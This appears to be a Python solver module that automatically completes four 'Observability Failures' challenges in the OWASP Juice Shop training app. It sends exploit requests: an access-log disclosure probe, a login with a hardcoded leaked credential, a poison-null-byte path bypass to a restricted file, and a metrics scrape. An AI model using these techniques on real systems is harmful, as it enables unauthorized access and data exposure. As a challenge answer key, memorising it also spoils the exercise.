"""Observability Failures category solvers (4 of 4). Verified against
routes/fileServer.ts, routes/login.ts, routes/metrics.ts, server.ts, and
config/default.yml (fetched 2026-08-09)."""
from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- server.ts: `/support/logs` is mounted with
# verify.accessControlChallenges(), which solves accessLogDisclosureChallenge
# the moment any request URL under that prefix matches /access\.log(0-9-)*/
# — the file doesn't need to actually exist on disk, the check runs before
# routes/logfileServer.ts even tries to read it. ---

@register("accessLogDisclosureChallenge", "Observability Failures", 4)
def solve_access_log_disclosure(ctx: SolverContext) -> None:
    ctx.client.get("/support/logs/access.log")


# --- routes/login.ts verifyPreLoginChallenges: same pre-login body-match
# pattern as loginSupportChallenge (Task 1's Security Misconfiguration
# solvers) — the "leaked" credential pair is a hardcoded literal. ---

@register("dlpPasswordSprayingChallenge", "Observability Failures", 5)
def solve_dlp_password_spraying(ctx: SolverContext) -> None:
    ctx.client.post("/rest/user/login", json={"email": f"J12934@{DOMAIN}", "password": "0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB"})


# --- routes/fileServer.ts verifySuccessfulPoisonNullByteExploit: same
# poison-null-byte technique used repeatedly in Phases 2-3, targeting the
# one remaining seeded file this specific challenge checks for. ---

@register("misplacedSignatureFileChallenge", "Observability Failures", 4)
def solve_misplaced_signature_file(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/suspicious_errors.yml%2500.md")


# --- routes/metrics.ts serveMetrics: solved as long as the request's
# User-Agent header doesn't contain any of config.default.yml's
# metricsIgnoredUserAgents ("Prometheus", "Alloy", "promscrape") — the
# default `requests`/Python User-Agent never matches any of those, so no
# special header is needed. ---

@register("exposedMetricsChallenge", "Observability Failures", 1)
def solve_exposed_metrics(ctx: SolverContext) -> None:
    ctx.client.get("/metrics").raise_for_status()
